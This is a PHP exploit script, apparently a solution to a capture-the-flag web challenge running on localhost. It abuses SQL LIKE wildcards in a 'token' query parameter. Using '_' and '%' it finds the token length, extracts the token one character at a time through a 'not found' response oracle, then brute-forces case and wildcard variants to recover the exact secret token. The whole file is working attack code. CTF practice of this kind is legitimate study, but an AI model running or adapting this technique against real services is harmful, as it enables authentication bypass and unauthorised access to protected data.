<?php

define('CHALL_URL', 'http://localhost:45004');


// Merci chatgpt
function gen_case_combo($str, $index = 0, $current = "") {
    if ($index === strlen($str)) {
        return [$current];
    }

    $combinations = [];
    $lower = strtolower($str[$index]);
    $upper = strtoupper($str[$index]);
    
    foreach (ctype_alpha($str[$index]) ? [$lower, $upper] : [$str[$index]] as $char) {
        foreach (gen_case_combo($str, $index + 1, $current . $char) as $combo) {
            $combinations[] = $combo;
        }
    }
    return $combinations;
}

function gen_special_combo($str, $index = 0) {
    
    if ($index === strlen($str)) {
        return [$str];
    }

    $combinations = gen_special_combo($str, $index + 1);
    if ($str[$index] === '_') {
        $str[$index] = '%';
        $combinations = array_merge($combinations, gen_special_combo($str, $index + 1));
    }

    return $combinations;
}

function do_req($payload) {
    $url = CHALL_URL . '/?token=' . urlencode($payload);
    return file_get_contents($url);
}

function get_token_length() {
    for ($len = 1; $len < 100; $len++) {
        $r = do_req(str_repeat('_', $len));
        if (strstr($r, 'not found'))
            return $len-1;
    }
    die ("Oops, something went wrong or token > 100 chars\n");
}

function generate_chars() {
    $chars = [];
    for ($code = 32; $code <= 126; $code++) {
        if (!ctype_upper(chr($code)) && $code != ord('%') && $code != ord('_')) 
            $chars[] = chr($code);
    }
    return $chars;
}

function guess_chars($len) {
    $found = '';
    $chars = generate_chars();

    for ($i = 0; $i < $len; $i++) {
        $current = null;
        shuffle($chars);
        foreach ($chars as $c) {
            $r = do_req("$found$c" . str_repeat('_', $len-$i-1));
            echo " |__ $found$c" . str_repeat('_', $len-$i-1) . "\r";
            if (strstr($r, "not found") === false) {
                $current = $c;
                break;
            }
        }
        $current = $current ?? '_';
        $found .= $current;
    }
    return $found;
}

function bruteforce_token($dict) {
    $i = 0;
    $l = count($dict);
    foreach ($dict as $token) {
        $i++;
        echo " |__ [$i/$l] $token\r";
        $r = do_req($token);
        if (strstr($r, "Hello"))
            return $token;
    }
    die('Oops, something went wrong...\n');
}

echo "# Step 1: Guessing token length...\n";
$len = get_token_length();
echo " |__ length=$len\n\n";

echo "# Step 2: Guessing lowercase token...\n";
$base_token = guess_chars($len);
echo "\n\n";

echo "# Step 3: Permumations of '%' and '_'\n";
$base_token_perms = gen_special_combo($base_token);
foreach ($base_token_perms as $combo) {
    echo " |__ $combo\n";
}
echo "\n";

echo "# Step 4: Case sensitive combinaisons\n";
$token_dict = [];
foreach ($base_token_perms as $perm) {
    $token_dict = array_merge($token_dict, gen_case_combo($perm));
}
echo " |__ " . count($token_dict) . " tokens generated.\n\n";

echo "# Step 5: Bruteforce\n";
shuffle($token_dict);
$super_token = bruteforce_token($token_dict);
echo "\n\n";

echo "# Result\n";
echo " |__ URL: /?token=" . urlencode($super_token) . "\n";
echo " |__ MSG: " . do_req($super_token) . "\n";

